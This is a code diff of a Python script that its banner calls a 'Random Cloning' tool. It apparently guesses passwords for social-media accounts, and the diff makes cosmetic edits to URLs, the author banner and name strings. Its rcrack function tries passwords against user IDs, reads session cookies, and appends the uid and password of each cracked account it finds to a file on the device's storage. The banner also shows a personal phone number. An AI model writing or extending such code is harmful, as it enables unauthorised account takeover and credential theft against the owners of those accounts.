@@ -18,9 +18,9 @@ def o():
     if Mahin == '1':
         i()
     if Mahin == '2':
-        os.system('xdg-open https://github.com/Maohammed ')
+        os.system('xdg-open https://github.com/Maohammed/Mohammed ')
     if Mahin == '3':
-        os.system('xdg-open https://github.com/Maohammed ')
+        os.system('xdg-open https://github.com/Maohammed/Mohammed ')
     if Mahin == 'E':
         os.system('exit')
         return None
@@ -135,7 +135,7 @@ logo=("""
 ███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
 
 \033[1;32m  ╔═══════════════════════════════════════════════════╗
-\033[1;97m  ╠══[Author:=======================> \33[1;38Raihan  \33[1;38m   ║
+\033[1;97m  ╠══[Author:=======================> \33[1;38 Raihan  \33[1;38m   ║
 \033[1;32m  ╠══[Facebook:=====================> Rai Han    ║ 
 \033[1;97m  ╠══[Whatsapp:=====================> 01765024742     ║
 \033[1;97m  ╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
@@ -303,14 +303,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\033[38;5;46m[Rai-Han] ' +uid+ '|' +ps+ '  \33[0;97m')
-                open('/sdcard/Rai-Han-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print('\033[38;5;46m[RaiHan] ' +uid+ '|' +ps+ '  \33[0;97m')
+                open('/sdcard/RaiHan-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r    \33[1;93m[\033[1;95mRai-Han\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
+        sys.stdout.write('\r    \33[1;93m[\033[1;95mRaiHan\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
